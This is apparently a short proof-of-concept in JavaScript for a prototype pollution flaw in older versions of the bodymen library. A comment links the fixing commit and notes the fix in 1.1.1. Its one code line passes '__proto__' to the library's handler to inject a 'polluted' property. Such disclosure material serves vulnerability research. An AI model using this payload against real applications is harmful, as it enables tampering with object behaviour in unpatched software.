//https://github.com/diegohaz/bodymen/commit/5d52e8cf360410ee697afd90937e6042c3a8653b
// PP has been fixed in 1.1.1
const x = require("bodymen");
x.handler('__proto__', 'polluted', 'yes')
